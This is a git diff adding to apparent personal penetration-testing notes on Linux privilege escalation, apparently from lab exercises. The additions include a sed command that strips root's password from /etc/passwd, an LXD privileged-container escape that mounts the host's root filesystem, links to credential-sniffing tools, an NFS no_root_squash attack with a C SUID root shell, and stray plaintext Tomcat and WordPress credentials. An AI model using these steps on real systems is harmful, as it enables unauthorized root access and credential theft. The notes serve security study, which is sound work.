@@ -147,6 +147,11 @@ payload for vim capabilities for cap_dac_override+eip
 ```bash
 echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
 ```
+Or to remove root password, 
+
+```bash
+sed -i 's/^root:x:/root::/' /etc/passwd
+```
 
 ## CronJobs
 
@@ -185,3 +190,65 @@ container-user@nix02:~$ lxc image list
 | ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
 +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
 ```
+
+After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the security.privileged flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.
+
+```bash
+lxc init ubuntutemp privesc -c security.privileged=true
+xc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+```
+
+Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the resource of the host system as root.
+
+```bash
+lxc start privesc
+lxc exec privesc /bin/bash
+ls -l /mnt/root
+```
+
+## Other techniques:
+
+Tools to snif traffic 
+
+https://github.com/DanMcInerney/net-creds
+
+https://github.com/lgandx/PCredz
+
+## NFS systems
+
+Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command showmount -e, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.
+
+to see mounts 
+
+```bash
+showmount -e IP
+```
+no_root_squash	Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.
+
+Create the following shell
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+int main(void)
+{
+  setuid(0); setgid(0); system("/bin/bash");
+}
+```
+```bash
+sudo mount -t nfs 10.129.2.12:/tmp /mnt
+cp shell /mnt
+chmod u+s /mnt/shell
+```
+
+we go to TMP and execute the shell after compiling it.
+
+
+<user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
+
+
+define( 'DB_USER', 'admin' );
+define( 'DB_PASSWORD', 'WP_admin_s3cure_pass!' );
